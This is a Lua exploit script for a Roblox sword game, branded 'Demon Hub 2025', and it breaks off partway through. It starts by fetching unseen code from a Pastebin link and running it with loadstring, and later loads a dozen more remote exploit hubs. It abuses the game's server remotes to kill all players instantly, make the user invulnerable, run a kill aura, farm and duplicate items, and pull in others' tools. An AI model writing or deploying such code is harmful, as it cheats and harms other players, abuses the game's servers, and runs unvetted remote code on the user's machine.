--[[


██████╗░███████╗███╗░░░███╗░█████╗░███╗░░██╗  ██╗░░██╗██╗░░░██╗██████╗░  ██╗░░░██╗██████╗░
██╔══██╗██╔════╝████╗░████║██╔══██╗████╗░██║  ██║░░██║██║░░░██║██╔══██╗  ██║░░░██║╚════██╗
██║░░██║█████╗░░██╔████╔██║██║░░██║██╔██╗██║  ███████║██║░░░██║██████╦╝  ╚██╗░██╔╝░█████╔╝
██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║  ██╔══██║██║░░░██║██╔══██╗  ░╚████╔╝░░╚═══██╗
██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║  ██║░░██║╚██████╔╝██████╦╝  ░░╚██╔╝░░██████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═╝░░╚═╝░╚═════╝░╚═════╝░  ░░░╚═╝░░░╚═════╝░

██████╗░░█████╗░██████╗░███████╗
╚════██╗██╔══██╗╚════██╗██╔════╝
░░███╔═╝██║░░██║░░███╔═╝██████╗░
██╔══╝░░██║░░██║██╔══╝░░╚════██╗
███████╗╚█████╔╝███████╗██████╔╝
╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
--]]

-- Get and run remote script from Pastebin
local url = "https://pastebin.com/raw/cbBsFWLF"
local response = game:HttpGet(url)
local func = loadstring(response)
func()
task.wait(1)

--[[
╔══════════════════════════════════════════════════════════════════════╗
║              DEMON HUB 2025 - CORRUPT CORE EDITION                  ║
║                           Version: V4                               ║
║                    CORRUPTED and CRAFTED by AlznDev                 ║
╚══════════════════════════════════════════════════════════════════════╝
]]

-- ════════════════ 1. CONFIGURATION & CONSTANTS ════════════════
local CONFIG = {
    VERSION = "4",
    NOTIFICATION_SOUND = "rbxassetid://570433034",
    UI_LIBRARY_URL = "https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt",
    
    THEME = {
        PRIMARY_COLOR = Color3.fromRGB(138, 43, 226),  -- Blue Violet
        SECONDARY_COLOR = Color3.fromRGB(75, 0, 130),   -- Indigo
        ACCENT_COLOR = Color3.fromRGB(30, 144, 255)     -- Dodger Blue
    }
}

-- Notification sound helper
local function playNotificationSound(soundId, volume)
    local sound = Instance.new("Sound", workspace)
    sound.SoundId = soundId or CONFIG.NOTIFICATION_SOUND
    sound.Volume = volume or 1
    sound:Play()
    sound.Ended:Connect(function()
        sound:Destroy()
    end)
end

-- ════════════════ 2. SERVICES ════════════════
local Services = {
    Players = game:GetService("Players"),
    RunService = game:GetService("RunService"),
    SoundService = game:GetService("SoundService"),
    UserInputService = game:GetService("UserInputService"),
    TweenService = game:GetService("TweenService"),
    Debris = game:GetService("Debris"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    StarterGui = game:GetService("StarterGui")
}

-- ════════════════ 3. GLOBAL VARIABLES ════════════════
local LocalPlayer = Services.Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")


-- State Management
local States = {
    SlowFarm = false,
    FastFarm = false,
    KillAura = false,
    GrabTools = false,
    KillAll = false,
    PermaGod = false,
    WalkSpeedLoop = false
}

-- Connections Storage
local Connections = {}

-- 4. ═══════════════ UTILITY FUNCTIONS ═══════════════
local Utils = {}

-- 4.1 Safe function execution with error handling
function Utils.SafeExecute(func, ...)
    local success, result = pcall(func, ...)
    if not success then
        warn("[Demon Hub] Error:", result)
        return false, result
    end
    return true, result
end

-- 4.2 Enhanced notification system
function Utils.Notify(title, text, duration)
    Services.StarterGui:SetCore("SendNotification", {
        Title = title or "Demon Hub",
        Text = text or "",
        Duration = duration or 3
    })
end

-- 4.3 Play sound with cleanup
function Utils.PlaySound(soundId, volume, callback)
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Volume = volume or 1
    sound.Parent = Services.SoundService

    sound.Ended:Connect(function()
        sound:Destroy()
        if callback then callback() end
    end)

    sound:Play()
    return sound
end

-- 4.4 Get character safely
function Utils.GetCharacter()
    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
end

-- 4.5 Get humanoid safely
function Utils.GetHumanoid()
    local char = Utils.GetCharacter()
    return char and char:FindFirstChildOfClass("Humanoid")
end

-- 4.6 Load external script safely
function Utils.LoadScript(url)
    Utils.SafeExecute(function()
        loadstring(game:HttpGet(url, true))()
    end)
end

-- 5. ═══════════════ INITIALIZATION ═══════════════
-- Play startup sound
Utils.PlaySound(CONFIG.NOTIFICATION_SOUND, 1, function()
    Utils.Notify("Demon Hub 2025", "Successfully loaded v" .. CONFIG.VERSION, 5)
end)

-- Load UI Library
local UILib = loadstring(game:HttpGet(CONFIG.UI_LIBRARY_URL))()
local Window = UILib:Window("Demon Hub 2025 | CORRUPT CORE v" .. CONFIG.VERSION)
local MainServer = Window:Server("Scripts", "")

-- Create UI Tabs
local Tabs = {
    Main = MainServer:Channel("Main"),
    Character = MainServer:Channel("Character"),
    Effects = MainServer:Channel("Effects"),
    Scripts = MainServer:Channel("Scripts"),
    Toggles = MainServer:Channel("Toggles"),
    UI = MainServer:Channel("UI"),
    Teleports = MainServer:Channel("Teleports"),
    Power = MainServer:Channel("Power"),
    Worlds = MainServer:Channel("Worlds"),
    Music = MainServer:Channel("Music"),
    Settings = MainServer:Channel("Settings")
}

-- 6. ═══════════════ CORE FUNCTIONS ═══════════════
local Core = {}

-- 6.1 Enhanced Sword Remote Firing
function Core.FireSwordRemote(times, delay)
    local char = Utils.GetCharacter()
    if not char then return end
    
    local sword = char:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
    if not sword then return end
    
    local handle = sword:FindFirstChild("Handle")
    if not handle then return end
    
    local up = handle:FindFirstChild("up")
    if not up then return end
    
    local remoteEvent = up:FindFirstChild("RemoteEvent")
    if not remoteEvent then return end
    
    for i = 1, times do
        remoteEvent:FireServer()
        if delay then task.wait(delay) end
    end
end

-- 6.2 Get all swords with caching
local swordCache = {}
function Core.GetSwords(useCache)
    if useCache and #swordCache > 0 then
        return swordCache
    end
    
    swordCache = {}
    local char = Utils.GetCharacter()
    local backpack = LocalPlayer.Backpack
    
    for _, container in ipairs({backpack, char}) do
        for _, tool in ipairs(container:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:lower():find("sword") then
                table.insert(swordCache, tool)
            end
        end
    end
    
    return swordCache
end

-- 6.3 Enhanced Kill Aura System
function Core.KillAuraSystem()
    local range = 40
    local killAuraActive = true
    
    -- Create range slider
    Tabs.Main:Slider("Kill Aura Range", 10, 1000, range, function(value)
        range = value
    end)
    
    -- Find and setup sword
    local function setupSword()
        local swords = Core.GetSwords()
        if #swords == 0 then return nil end
        
        local sword = swords[1]
        if sword.Parent == LocalPlayer.Backpack then
            Humanoid:EquipTool(sword)
            task.wait(0.1)
        end
        
        return sword
    end
    
    -- Main kill aura loop
    Connections.KillAura = Services.RunService.Heartbeat:Connect(function()
        if not killAuraActive or not States.KillAura then return end
        
        local sword = setupSword()
        if not sword then return end
        
        local handle = sword:FindFirstChild("Handle")
        local dmg = handle and handle:FindFirstChild("dmg")
        local remote = dmg and dmg:FindFirstChild("RemoteEvent")
        
        if not remote then return end
        
        local myRoot = Character:FindFirstChild("HumanoidRootPart")
        if not myRoot then return end
        
        for _, player in ipairs(Services.Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                local targetHum = player.Character:FindFirstChild("Humanoid")
                
                if targetRoot and targetHum and targetHum.Health > 0 then
                    local distance = (myRoot.Position - targetRoot.Position).Magnitude
                    if distance <= range then
                        remote:FireServer(targetHum, math.huge)
                    end
                end
            end
        end
    end)
    
    -- Toggle keybind
    Services.UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.E then
            killAuraActive = not killAuraActive
            Utils.Notify("Kill Aura", killAuraActive and "Activated" or "Deactivated", 2)
        end
    end)
end

-- 7. ═══════════════ FARMING SYSTEM ═══════════════
local Farming = {}

-- 7.1 Slow Farm
Tabs.Main:Button("Start Slow Farm", function()
    States.SlowFarm = true
    Utils.Notify("Farming", "Slow Farm activated", 2)
    
    task.spawn(function()
        while States.SlowFarm do
            Core.FireSwordRemote(4, 0.04)
            task.wait()
        end
    end)
end)

Tabs.Main:Button("Stop Slow Farm", function()
    States.SlowFarm = false
    Utils.Notify("Farming", "Slow Farm deactivated", 2)
end)

-- 7.2 Fast Farm
Tabs.Main:Button("Start Fast Farm", function()
    States.FastFarm = true
    Utils.Notify("Farming", "Fast Farm activated", 2)
    
    if not Connections.FastFarm then
        Connections.FastFarm = Services.RunService.Stepped:Connect(function()
            if States.FastFarm then
                Core.FireSwordRemote(6)
            end
        end)
    end
end)

Tabs.Main:Button("Stop Fast Farm", function()
    States.FastFarm = false
    if Connections.FastFarm then
        Connections.FastFarm:Disconnect()
        Connections.FastFarm = nil
    end
    Utils.Notify("Farming", "Fast Farm deactivated", 2)
end)

-- 8. ═══════════════ MAIN FEATURES ═══════════════
-- 8.1 Kill Aura
Tabs.Main:Button("Activate Kill Aura", function()
    if States.KillAura then return end
    States.KillAura = true
    Core.KillAuraSystem()
    Utils.Notify("Combat", "Kill Aura system initialized", 3)
end)

-- 8.2 Sword Damage Script
Tabs.Main:Button("Instant Kill Sword Damage", function()
    local swords = Core.GetSwords()
    local count = 0
    
    for _, sword in ipairs(swords) do
        Utils.SafeExecute(function()
            sword.Parent = LocalPlayer.Backpack
            sword.Handle.Massless = true
            sword.Handle.CanCollide = true
            sword.Parent = Character
            
            sword.Handle.Touched:Connect(function(hit)
                local targetHum = hit.Parent and hit.Parent:FindFirstChild("Humanoid")
                if targetHum and hit.Parent ~= Character then
                    local dmg = sword.Handle:FindFirstChild("dmg")
                    local remote = dmg and dmg:FindFirstChild("RemoteEvent")
                    if remote then
                        remote:FireServer(targetHum, math.huge)
                    end
                end
            end)
            
            count = count + 1
        end)
    end
    
 Utils.Notify("Combat", "Instant Kill: " .. count .. " Sword(s)", 3)
end)

-- 8.3 Infinite Yield
Tabs.Main:Button("Load Infinite Yield", function()
    Utils.LoadScript("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
end)

-- 9. ═══════════════ CHARACTER MODIFICATIONS ═══════════════
-- 9.1 Movement controls with validation
local Movement = {
    WalkSpeed = 16,
    JumpPower = 50
}

Tabs.Character:Slider("Walk Speed", 0, 500, Movement.WalkSpeed, function(value)
    Movement.WalkSpeed = value
    local hum = Utils.GetHumanoid()
    if hum then hum.WalkSpeed = value end
end)

Tabs.Character:Slider("Jump Power", 0, 500, Movement.JumpPower, function(value)
    Movement.JumpPower = value
    local hum = Utils.GetHumanoid()
    if hum then hum.JumpPower = value end
end)

-- 9.2 Quick Speed Buttons
local speedPresets = {
    {name = "Normal Speed", speed = 16, jump = 50},
    {name = "Fast Speed", speed = 100, jump = 100},
    {name = "Super Speed", speed = 250, jump = 150},
    {name = "Godspeed", speed = 500, jump = 200}
}

for _, preset in ipairs(speedPresets) do
    Tabs.Character:Button(preset.name, function()
        Movement.WalkSpeed = preset.speed
        Movement.JumpPower = preset.jump
        local hum = Utils.GetHumanoid()
        if hum then
            hum.WalkSpeed = preset.speed
            hum.JumpPower = preset.jump
        end
        Utils.Notify("Movement", preset.name .. " activated", 2)
    end)
end

-- 9.3 Enhanced Respawn
Tabs.Character:Button("Smart Respawn", function()
    local char = Utils.GetCharacter()
    if not char then return end
    
    local pos = RootPart.CFrame
    local hum = Utils.GetHumanoid()
    
    if hum then
        hum.Health = 0
        LocalPlayer.CharacterAdded:Wait()
        task.wait(0.2)
        
        local newRoot = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
        newRoot.CFrame = pos
        Utils.Notify("Respawn", "Respawned at saved position", 2)
    end
end)

-- 9.4 God Mode System
Tabs.Character:Button("Activate God Mode", function()
    local hum = Utils.GetHumanoid()
    if not hum then return end
    
    local sword = Character:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
    if sword then
        local dmg = sword.Handle:FindFirstChild("dmg")
        local remote = dmg and dmg:FindFirstChild("RemoteEvent")
        if remote then
            remote:FireServer(hum, -math.huge)
            Utils.Notify("God Mode", "Activated successfully", 3)
        end
    end
end)

-- 9.5 Fixed Perma God Toggle
Tabs.Character:Toggle("Permanent God Mode", false, function(state)
    States.PermaGod = state
    
    if state then
        -- Main god mode healing loop
        task.spawn(function()
            while States.PermaGod do
                Utils.SafeExecute(function()
                    local hum = Utils.GetHumanoid()
                    local sword = Character:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
                    
                    if hum and sword then
                        local dmg = sword.Handle:FindFirstChild("dmg")
                        local remote = dmg and dmg:FindFirstChild("RemoteEvent")
                        if remote then
                            remote:FireServer(hum, -math.huge)
                        end
                    end
                    
                    -- Backup health protection
                    if hum then
                        hum.Health = math.max(hum.Health, hum.MaxHealth)
                    end
                end)
                task.wait(0.1) -- Run 10 times per second
            end
        end)
        
        -- Prevent external tool pickup specifically
        task.spawn(function()
            while States.PermaGod do
                Utils.SafeExecute(function()
                    local hum = Utils.GetHumanoid()
                    if hum then
                        -- Check for tools that aren't your sword
                        for _, tool in pairs(Character:GetChildren()) do
                            if tool:IsA("Tool") and tool.Name ~= "sword" then
                                -- Move unauthorized tools back to workspace
                                tool.Parent = LocalPlayer.Backpack
                                task.wait(0.1)
                                if tool.Parent == LocalPlayer.Backpack then
                                    tool.Parent = workspace
                                end
                            end
                        end
                    end
                end)
                task.wait(0.2)
            end
        end)
        
        -- Hook into tool added events to prevent pickup
        local toolConnection = Character.ChildAdded:Connect(function(child)
            if States.PermaGod and child:IsA("Tool") and child.Name ~= "sword" then
                task.wait(0.1) -- Small delay to avoid conflicts
                if child.Parent == Character then
                    child.Parent = workspace
                end
            end
        end)
        
        -- Enhanced health monitoring
        task.spawn(function()
            while States.PermaGod do
                Utils.SafeExecute(function()
                    local hum = Utils.GetHumanoid()
                    if hum then
                        -- Force health to stay at max
                        if hum.Health < hum.MaxHealth then
                            hum.Health = hum.MaxHealth
                            
                            -- Also trigger sword heal as backup
                            local sword = Character:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
                            if sword then
                                local dmg = sword.Handle:FindFirstChild("dmg")
                                local remote = dmg and dmg:FindFirstChild("RemoteEvent")
                                if remote then
                                    remote:FireServer(hum, -math.huge)
                                end
                            end
                        end
                    end
                end)
                task.wait(0.05) -- Check health very frequently
            end
        end)
        
        -- Store connection for cleanup
        States.ToolConnection = toolConnection
        
    else
        -- Cleanup when disabled
        if States.ToolConnection then
            States.ToolConnection:Disconnect()
            States.ToolConnection = nil
        end
    end
end)

local Effects = {}

-- Apply flame colors with smooth transitions
function Effects.ApplyFlameColors(colors, loops)
    local eff = workspace:FindFirstChild("eff")
    if not eff then return end
    
    local event = eff:FindFirstChild("RemoteEvent")
    if not event then return end
    
    for i = 1, loops do
        for _, color in ipairs(colors) do
            event:FireServer(color)
            task.wait(0.0001)
        end
    end
end

-- Enhanced spawn and drop
function Effects.SpawnAndDrop()
    Utils.SafeExecute(function()
        workspace.load.RemoteEvent:FireServer()
        task.wait(0.21)

        -- Equip all tools
        for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = Character
            end
        end

        -- Drop with tag
        for _, tool in pairs(Character:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = workspace
                local tag = Instance.new("StringValue")
                tag.Name = "DemonHubTag"
                tag.Parent = tool
            end
        end
    end)
end

-- Cleanup system
function Effects.Cleanup()
    for _, tool in pairs(workspace:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("DemonHubTag") then
            tool:FindFirstChild("DemonHubTag"):Destroy()
        end
    end
end

-- Define flame effect configurations (using only: Black, Blue, Purple, Red)
local flameEffects = {
    -- Single color flames
    {name = "Purple Inferno", colors = {"Purple"}},
    {name = "Crimson Blaze", colors = {"Red"}},
    {name = "Shadow Flame", colors = {"Black"}},
    {name = "Azure Fire", colors = {"Blue"}},
    
    -- Dual color combinations
    {name = "Twilight Fury", colors = {"Purple", "Red"}},
    {name = "Mystic Frost", colors = {"Purple", "Blue"}},
    {name = "Eclipse Shadow", colors = {"Purple", "Black"}},
    {name = "Storm Blaze", colors = {"Red", "Blue"}},
    {name = "Obsidian Fire", colors = {"Black", "Red"}},
    {name = "Abyssal Storm", colors = {"Black", "Blue"}},
    {name = "Royal Flame", colors = {"Red", "Purple"}},
    {name = "Void Frost", colors = {"Black", "Purple"}},
    {name = "Crimson Storm", colors = {"Red", "Black"}},
    {name = "Arctic Blaze", colors = {"Blue", "Red"}},
    {name = "Midnight Blue", colors = {"Blue", "Black"}},
    {name = "Violet Storm", colors = {"Blue", "Purple"}},
    
    -- Triple color combinations
    {name = "Trinity Flame", colors = {"Red", "Purple", "Blue"}},
    {name = "Dark Trinity", colors = {"Black", "Red", "Purple"}},
    {name = "Void Radiance", colors = {"Black", "Blue", "Purple"}},
    {name = "Crimson Void", colors = {"Red", "Black", "Blue"}},
    {name = "Shadow Storm", colors = {"Purple", "Black", "Red"}},
    {name = "Abyssal Trinity", colors = {"Black", "Purple", "Blue"}},
    {name = "Blood Moon", colors = {"Red", "Purple", "Black"}},
    {name = "Frozen Storm", colors = {"Blue", "Red", "Black"}},
    {name = "Mystic Blaze", colors = {"Purple", "Blue", "Red"}},
    {name = "Eclipse Fire", colors = {"Black", "Red", "Blue"}},
    
    -- Quad color combination (all colors)
    {name = "Chaos Inferno", colors = {"Red", "Blue", "Purple", "Black"}},
    {name = "Elemental Fury", colors = {"Black", "Red", "Blue", "Purple"}},
    {name = "Prism Storm", colors = {"Purple", "Red", "Black", "Blue"}},
    {name = "Void Spectrum", colors = {"Black", "Purple", "Red", "Blue"}},
    {name = "Ultimate Blaze", colors = {"Red", "Purple", "Blue", "Black"}},
    {name = "Omniferno", colors = {"Blue", "Black", "Red", "Purple"}},
    {name = "Apex Flame", colors = {"Purple", "Black", "Blue", "Red"}},
    {name = "Master Inferno", colors = {"Red", "Black", "Purple", "Blue"}}
}

-- Always dupe 25 times per effect
local DESIRED_DUPE_COUNT = 25
local COLOR_LOOP_PER_DUPE = 3 -- tweak this if needed

for _, effect in ipairs(flameEffects) do
    Tabs.Effects:Button(effect.name, function()
        Utils.Notify("Effects", "Applying " .. effect.name, 2)
        for i = 1, DESIRED_DUPE_COUNT do
            Effects.ApplyFlameColors(effect.colors, COLOR_LOOP_PER_DUPE)
            task.wait(0.0001)
            Effects.SpawnAndDrop()
        end
        Effects.Cleanup()
        Utils.Notify("Effects", effect.name .. " completed", 3)
    end)
end

-- 11. ═══════════════ EXTERNAL SCRIPTS ═══════════════
local externalScripts = {
    {name = "Exclusive Hub", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Exclusive%20Hub.lua"},
    {name = "2take1.tk", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/2take1"},
    {name = "Sword Simulator Hub", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Sword%20Simulator%20Hub"},
    {name = "Liquids GUI", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Liquid's%20Gui"},
    {name = "Auratus X Hub", url = "https://raw.githubusercontent.com/AnimatedKurai/Scripts/refs/heads/main/Auratus%20Hub.txt"},
    {name = "Replication UI", url = "https://raw.githubusercontent.com/EEND2SCRIPTS/Replication/main/replication"},
    {name = "Emperor Wings", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Emperor%20Wings.lua"},
    {name = "Ghost Hub", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Ghost_Hub"},
    {name = "Dragon Hub Premium", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/main/Dragon%2520Hub"},
    {name = "Slayer Hub", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/main/Truecode"},
    {name = "Line's Script Hub", url = "https://raw.githubusercontent.com/Zacky-pixel-sketch/Hubs/main/Demon%20hub%20source%20code.lua"}
}

for _, script in ipairs(externalScripts) do
    Tabs.Scripts:Button(script.name, function()
        Utils.LoadScript(script.url)
    end)
end

-- 12. ═══════════════ ADVANCED SWORD STYLES ═══════════════
-- 12.1 Enhanced Sword Spin (Multiplayer Visible - Working)
Tabs.Scripts:Button("Dynamic Sword Spin", function()
    local swords = Core.GetSwords()
    if #swords == 0 then 
        Utils.Notify("Error", "No swords found", 2)
        return 
    end
    
    local spinning = true
    local spinSpeed = 2
    local distance = 6
    local angleOffset = 0
    
    -- Setup swords by cloning them and keeping originals
    local spinSwords = {}
    local originalSwords = {}
    
    for _, sword in ipairs(swords) do
        -- Store original for later restoration
        table.insert(originalSwords, sword)
        
        -- Clone the sword for spinning
        local clonedSword = sword:Clone()
        clonedSword.Parent = workspace
        clonedSword.Name = sword.Name .. "_Spinning"
        
        if clonedSword:FindFirstChild("Handle") then
            clonedSword.Handle.Massless = true
            clonedSword.Handle.CanCollide = false
            
            -- Create BodyPosition for smooth movement
            local bodyPos = Instance.new("BodyPosition")
            bodyPos.MaxForce = Vector3.new(4000, 4000, 4000)
            bodyPos.P = 3000
            bodyPos.D = 500
            bodyPos.Parent = clonedSword.Handle
            
            -- Create BodyAngularVelocity for rotation
            local bodyAngVel = Instance.new("BodyAngularVelocity")
            bodyAngVel.MaxTorque = Vector3.new(4000, 4000, 4000)
            bodyAngVel.AngularVelocity = Vector3.new(0, 10, 0)
            bodyAngVel.Parent = clonedSword.Handle
            
            table.insert(spinSwords, {
                sword = clonedSword, 
                bodyPos = bodyPos, 
                bodyAngVel = bodyAngVel
            })
        end
        
        -- Hide original sword
        sword.Parent = nil
    end
    
    -- Spin connection
    local spinConn = Services.RunService.Heartbeat:Connect(function(dt)
        if not spinning then return end
        
        angleOffset = angleOffset + dt * spinSpeed
        local humanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then return end
        
        for i, swordData in ipairs(spinSwords) do
            if swordData.bodyPos and swordData.bodyPos.Parent then
                local angle = (2 * math.pi / #spinSwords) * (i - 1) + angleOffset
                local offsetPos = Vector3.new(
                    distance * math.sin(angle),
                    2 * math.sin(angleOffset * 2 + i),  -- Add some vertical wave motion
                    distance * math.cos(angle)
                )
                
                -- Update position relative to player
                swordData.bodyPos.Position = humanoidRootPart.Position + offsetPos
            end
        end
    end)
    
    -- Cleanup function
    local function cleanup()
        spinning = false
        if spinConn then
            spinConn:Disconnect()
        end
        
        -- Remove spinning swords
        for _, swordData in ipairs(spinSwords) do
            if swordData.sword and swordData.sword.Parent then
                swordData.sword:Destroy()
            end
        end
        
        -- Restore original swords
        for _, originalSword in ipairs(originalSwords) do
            if originalSword then
                originalSword.Parent = Character
            end
        end
        
        Utils.Notify("Sword Spin", "Deactivated", 2)
    end
    
    -- Stop on X key
    local inputConn = Services.UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.X then
            cleanup()
            inputConn:Disconnect()
        end
    end)
    
    -- Auto-cleanup if character dies
    local humanoid = Character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.Died:Connect(cleanup)
    end
    
    Utils.Notify("Sword Spin", "Press X to stop | " .. #spinSwords .. " swords spinning", 3)
end)

-- 12.2 Sword Halo
Tabs.Scripts:Button("Sword Halo", function()
    local swords = Core.GetSwords()
    if #swords == 0 then return end
    
    local head = Character:FindFirstChild("Head")
    if not head then return end
    
    local radius = 5
    local height = head.Size.Y / 2 + 3
    local angleStep = 2 * math.pi / #swords
    
    for i, sword in ipairs(swords) do
        sword.Parent = Character
        local angle = angleStep * (i - 1)
        local offset = CFrame.new(math.cos(angle) * radius, height, math.sin(angle) * radius)
        local rotation = CFrame.Angles(0, angle, math.rad(90))
        sword.Grip = Character.PrimaryPart.CFrame:Inverse() * head.CFrame * offset * rotation
    end
    
    Utils.Notify("Sword Style", "Halo applied", 2)
end)

-- 12.3 Advanced Sword Formation
Tabs.Scripts:Button("Matrix Formation", function()
    local swords = Core.GetSwords()
    if #swords == 0 then return end
    
    local formations = {
        -- Front formation
        CFrame.new(-2.4, 2.3, 2.3) * CFrame.Angles(0, 0, math.rad(-45)),
        CFrame.new(0, 2.3, 3.1),
        CFrame.new(2.4, 2.3, 2.3) * CFrame.Angles(0, 0, math.rad(45)),
        -- Middle formation
        CFrame.new(-2.4, 0, 3.1) * CFrame.Angles(0, 0, math.rad(-25)),
        CFrame.new(0, 0, 3.6),
        CFrame.new(2.4, 0, 3.1) * CFrame.Angles(0, 0, math.rad(25)),
        -- Lower formation
        CFrame.new(-2.4, -2.3, 2.3) * CFrame.Angles(0, 0, math.rad(-45)),
        CFrame.new(0, -2.3, 3.1),
        CFrame.new(2.4, -2.3, 2.3) * CFrame.Angles(0, 0, math.rad(45)),
        -- Back formation
        CFrame.new(2.4, 2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(-45)),
        CFrame.new(0, 2.3, -3.1) * CFrame.Angles(0, math.rad(180), 0),
        CFrame.new(-2.4, 2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(45)),
        -- Back middle
        CFrame.new(2.4, 0, -3.1) * CFrame.Angles(0, math.rad(180), math.rad(-25)),
        CFrame.new(0, 0, -3.6) * CFrame.Angles(0, math.rad(180), 0),
        CFrame.new(-2.4, 0, -3.1) * CFrame.Angles(0, math.rad(180), math.rad(25)),
        -- Back lower
        CFrame.new(2.4, -2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(-45)),
        CFrame.new(0, -2.3, -3.1) * CFrame.Angles(0, math.rad(180), 0),
        CFrame.new(-2.4, -2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(45))
    }
    
    for i, sword in ipairs(swords) do
        local formation = formations[i]
        if not formation then break end
        
        sword.Parent = LocalPlayer.Backpack
        if sword:FindFirstChild("Handle") then
            sword.Handle.Massless = true
            sword.Handle.CanCollide = false
        end
        sword.Grip = formation
        sword.Parent = Character
    end
    
    Utils.Notify("Sword Style", "Matrix formation applied", 2)
end)

-- 13. ═══════════════ TOGGLE FEATURES ═══════════════
-- 13.1 Auto Grab Tools
Tabs.Toggles:Toggle("Auto Grab Tools", false, function(state)
    States.GrabTools = state
    
    if Connections.GrabTools then
        Connections.GrabTools:Disconnect()
        Connections.GrabTools = nil
    end
    
    if state then
        Connections.GrabTools = Services.RunService.Heartbeat:Connect(function()
            local root = Character:FindFirstChild("HumanoidRootPart")
            if not root then return end
            
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("Tool") and obj.Name:lower():find("sword") then
                    local handle = obj:FindFirstChild("Handle")
                    if handle and handle:FindFirstChildOfClass("TouchTransmitter") then
                        firetouchinterest(root, handle, 0)
                        firetouchinterest(root, handle, 1)
                    end
                end
            end
        end)
    end
end)

-- 13.2 Enhanced Drop Tools
Tabs.Toggles:Toggle("Auto Drop Tools", false, function(state)
    if state then
        local humanoid = Character:FindFirstChildWhichIsA("Humanoid")
        if humanoid then
            humanoid:UnequipTools() -- Ensure tools are in Backpack
        end

        for _, container in ipairs({LocalPlayer.Backpack, Character}) do
            for _, tool in ipairs(container:GetChildren()) do
                if tool:IsA("Tool") then
                    tool.CanBeDropped = true
                    if humanoid then
                        humanoid:EquipTool(tool)
                        wait(0.1)
                        humanoid:DropTool()
                    end
                end
            end
        end
    end
end)

-- 13.3 Kill All Players
Tabs.Toggles:Toggle("Kill All Players", false, function(state)
    States.KillAll = state
    
    if state then
        task.spawn(function()
            while States.KillAll do
                local myRoot = Character:FindFirstChild("HumanoidRootPart")
                if myRoot then
                    for _, player in ipairs(Services.Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character then
                            local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                            local targetHum = player.Character:FindFirstChild("Humanoid")
                            
                            if targetRoot and targetHum and targetHum.Health > 0 then
                                local distance = (myRoot.Position - targetRoot.Position).Magnitude
                                if distance < 1000 then
                                    -- Find and use sword
                                    local sword = Character:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
                                    if sword then
                                        if sword.Parent == LocalPlayer.Backpack then
                                            Humanoid:EquipTool(sword)
                                            task.wait(0.1)
                                        end
                                        
                                        local dmg = sword.Handle:FindFirstChild("dmg")
                                        local remote = dmg and dmg:FindFirstChild("RemoteEvent")
                                        if remote then
                                            remote:FireServer(targetHum, math.huge)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0)
            end
        end)
    end
end)

-- 13.4 Loop Walk Speed
Tabs.Toggles:Toggle("Lock Walk Speed (100)", false, function(state)
    States.WalkSpeedLoop = state
    
    if state then
        task.spawn(function()
            while States.WalkSpeedLoop do
                local hum = Utils.GetHumanoid()
                if hum then
                    hum.WalkSpeed = 100
                end
                task.wait()
            end
        end)
    end
end)

-- 14. ═══════════════ UI MODIFICATIONS ═══════════════
-- 14.1 Enhanced Effects GUI Destroyer
Tabs.UI:Button("Remove Effects GUI", function()
    local function destroyEffectsUI()
        -- Remove from all GUIs
        for _, gui in ipairs({Services.StarterGui, LocalPlayer:WaitForChild("PlayerGui")}) do
            local passes = gui:FindFirstChild("passes")
            if passes then
                for _, child in ipairs(passes:GetChildren()) do
                    if child:IsA("Frame") or child:IsA("TextButton") then
                        child:Destroy()
                    end
                end
            end
        end
    end
    
    -- Initial removal
    destroyEffectsUI()
    
    -- Auto-remove on respawn
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        destroyEffectsUI()
    end)
    
